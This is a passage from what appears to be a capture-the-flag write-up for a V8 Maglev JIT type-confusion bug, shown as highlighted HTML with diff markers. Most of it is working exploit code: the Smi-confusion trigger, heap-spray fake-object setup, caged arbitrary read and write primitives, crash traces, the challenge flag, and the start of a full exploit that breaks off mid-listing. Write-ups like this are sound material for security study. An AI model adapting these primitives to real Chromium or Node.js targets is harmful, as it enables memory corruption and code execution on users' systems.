+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>y</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>]; <span style=color:#75715e>//Maglev infers x to be an HeapObj
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>y</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0.1</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>obj</span>.<span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>; <span style=color:#75715e>//Maglev doesn&#39;t update the object map :)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>y</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>target</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>p</span><span style=color:#f92672>:</span> {<span style=color:#a6e22e>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>} };
+</span></span><span style=display:flex><span><span style=color:#a6e22e>target</span>.<span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>trigger</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, [<span style=color:#ae81ff>1.1</span>]);
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeMaglevOnNextCall</span>(<span style=color:#a6e22e>trigger</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, [<span style=color:#ae81ff>1.1</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, <span style=color:#a6e22e>EVIL_SMI</span>);
+</span></span></code></pre></div><p>Let&rsquo;s try running with <code>--verify-heap</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./d8 --allow-natives-syntax --verify-heap test.js 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Fatal error</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check failed: r.IsHeapObject() implies IsHeapObject(value).</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#FailureMessage Object: 0x7ffc860c34c0</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>====</span> C stack trace <span style=color:#f92672>===============================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::base::debug::StackTrace::StackTrace<span style=color:#f92672>()</span>+0x1e<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x56381a23b28e<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>+0x3b97a9b<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x56381a23aa9b<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>V8_Fatal<span style=color:#f92672>(</span>char const*, ...<span style=color:#f92672>)</span>+0x16f<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x56381a22bc5f<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::JSObject::JSObjectVerify<span style=color:#f92672>(</span>v8::internal::Isolate*<span style=color:#f92672>)</span>+0x5ba<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818a64aea<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::HeapObject::HeapObjectVerify<span style=color:#f92672>(</span>v8::internal::Isolate*<span style=color:#f92672>)</span>+0x1ec<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818a620ac<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::Object::ObjectVerify<span style=color:#f92672>(</span>v8::internal::Tagged&lt;v8::internal::Object&gt;, v8::internal::Isolate*<span style=color:#f92672>)</span>+0x70<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818a61e40<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::HeapVerification::VerifyObject<span style=color:#f92672>(</span>v8::internal::Tagged&lt;v8::internal::HeapObject&gt;<span style=color:#f92672>)</span>+0x78<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818ba2a58<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::SemiSpaceNewSpace::Verify<span style=color:#f92672>(</span>v8::internal::Isolate*, v8::internal::SpaceVerificationVisitor*<span style=color:#f92672>)</span> const+0xaa<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818c4f60a<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::HeapVerification::Verify<span style=color:#f92672>()</span>+0x1ee<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818ba246e<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::HeapVerifier::VerifyHeap<span style=color:#f92672>(</span>v8::internal::Heap*<span style=color:#f92672>)</span>+0x13e<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818ba9b4e<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::Heap::TearDownWithSharedHeap<span style=color:#f92672>()</span>+0x31<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818bcfe61<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::Isolate::Deinit<span style=color:#f92672>()</span>+0x488<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818ac9e18<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::Isolate::Deinitialize<span style=color:#f92672>(</span>v8::internal::Isolate*<span style=color:#f92672>)</span>+0xac<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818ac986c<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::internal::Isolate::Delete<span style=color:#f92672>(</span>v8::internal::Isolate*<span style=color:#f92672>)</span>+0xe<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818ac97ae<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::Shell::OnExit<span style=color:#f92672>(</span>v8::Isolate*, bool<span style=color:#f92672>)</span>+0xbf<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x5638188573ff<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>v8::Shell::Main<span style=color:#f92672>(</span>int, char**<span style=color:#f92672>)</span>+0xfe9<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x563818868d69<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    /lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>+0x2a1ca<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x7d15ccc2a1ca<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    /lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>__libc_start_main+0x8b<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x7d15ccc2a28b<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    ./d8<span style=color:#f92672>(</span>_start+0x2a<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>0x56381883302a<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Trace/breakpoint trap <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>We are abusing the omitted heapObj checks to make an Smi land inside an heapObj field of a JS object, without updating its map, which is why V8 aborts when running with <code>--verify-heap</code>.</p><p>We are also crafting a fake object layout at the memory address pointed by the Smi.</p><p>Now consider these functions optimized on our specific object shape:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>p</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>y</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>p</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>y</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>target</span>, <span style=color:#ae81ff>1.1</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Since we can corrupt its field without updating the map those functions won&rsquo;t deoptimize and will dereference our Smi as our crafted fake object.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_ab</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_f64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>conv_ab</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_u64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigUint64Array</span>(<span style=color:#a6e22e>conv_ab</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EMPTY_PROPERTIES_ADDR</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7e5</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>MAP_JSARR_PACKED_DOUBLES_ADDR</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100ba71</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FIXED_ARRAY</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x38c002a</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EVIL_SMI</span> <span style=color:#f92672>=</span> (Number(<span style=color:#a6e22e>FIXED_ARRAY</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>conv_u64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>x</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>conv_f64</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>conv_f64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>conv_u64</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>spray</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#ae81ff>0x4fe0000</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>); <span style=color:#75715e>//FIXED_ARRAY should be constant
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>MAP_JSARR_PACKED_DOUBLES_ADDR</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#ae81ff>0xbeef</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>obj</span>, <span style=color:#a6e22e>x</span>) {  
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>y</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>]; <span style=color:#75715e>//Maglev infers x must be an HeapObj
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>y</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0.1</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>obj</span>.<span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>; <span style=color:#75715e>//Maglev doesn&#39;t update the object map :)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>y</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>target</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>p</span><span style=color:#f92672>:</span> {<span style=color:#a6e22e>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>} };
+</span></span><span style=display:flex><span><span style=color:#a6e22e>target</span>.<span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>p</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>y</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>p</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>y</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>get</span>);
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>set</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>target</span>, <span style=color:#ae81ff>1.1</span>);
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeMaglevOnNextCall</span>(<span style=color:#a6e22e>get</span>);
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeMaglevOnNextCall</span>(<span style=color:#a6e22e>set</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>target</span>, <span style=color:#ae81ff>1.1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>trigger</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, [<span style=color:#ae81ff>1.1</span>]);
+</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeMaglevOnNextCall</span>(<span style=color:#a6e22e>trigger</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, [<span style=color:#ae81ff>1.1</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, <span style=color:#a6e22e>EVIL_SMI</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>y</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>x</span>)<span style=color:#f92672>-</span><span style=color:#ae81ff>7</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff00000000</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>target</span>, <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>tmp</span> <span style=color:#f92672>|</span> <span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>y</span>)));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>caged_read</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>x</span>)<span style=color:#f92672>-</span><span style=color:#ae81ff>7</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (<span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>))) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>caged_write</span>(<span style=color:#ae81ff>0x41414141</span><span style=color:#a6e22e>n</span>, <span style=color:#ae81ff>0xdeadbeef</span>);
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./d8 --allow-natives-syntax test.js 
+</span></span><span style=display:flex><span>Received signal <span style=color:#ae81ff>11</span> SEGV_ACCERR 374b41414141
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>====</span> C stack trace <span style=color:#f92672>===============================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>./d8<span style=color:#f92672>(</span>_ZN2v84base5debug10StackTraceC1Ev+0x1e<span style=color:#f92672>)[</span>0x56e3eb16228e<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>./d8<span style=color:#f92672>(</span>+0x3b981d6<span style=color:#f92672>)[</span>0x56e3eb1621d6<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/lib/x86_64-linux-gnu/libc.so.6<span style=color:#f92672>(</span>+0x45330<span style=color:#f92672>)[</span>0x73ebb2e45330<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x56e3c41c0090<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>end of stack trace<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>We now have all we need to build our arb R/W primitives and get the flag from the <strong>Triforce</strong> method.</p><p>We will simply be using a Worker thread to call the method in a loop while our main thread concurrently modifies the value of the string to pass the checks.</p><h2 id=flag>Flag</h2><p><code>TRX{good_luck_for_part_2_0560574d8739cba5}</code></p><h2 id=full-exploit>Full exploit</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_ab</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_f64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>conv_ab</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>conv_u64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigUint64Array</span>(<span style=color:#a6e22e>conv_ab</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EMPTY_PROPERTIES_ADDR</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7e5</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>MAP_JSARR_PACKED_DOUBLES_ADDR</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100ba71</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FIXED_ARRAY</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x38c002a</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>FIXED_OBJ_ARRAY</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8d00018</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EVIL_SMI</span> <span style=color:#f92672>=</span> (Number(<span style=color:#a6e22e>FIXED_ARRAY</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> {};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>conv_u64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>x</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>conv_f64</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>conv_f64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>conv_u64</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>spin</span>(<span style=color:#a6e22e>ms</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>end</span> <span style=color:#f92672>=</span> Date.<span style=color:#a6e22e>now</span>() <span style=color:#f92672>+</span> <span style=color:#a6e22e>ms</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(Date.<span style=color:#a6e22e>now</span>() <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>end</span>);
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>gc</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> <span style=color:#ae81ff>30</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>spray</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#ae81ff>0x4fe0000</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>); <span style=color:#75715e>//FixedDoubleArray address should be constant
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>MAP_JSARR_PACKED_DOUBLES_ADDR</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>FIXED_OBJ_ARRAY</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>
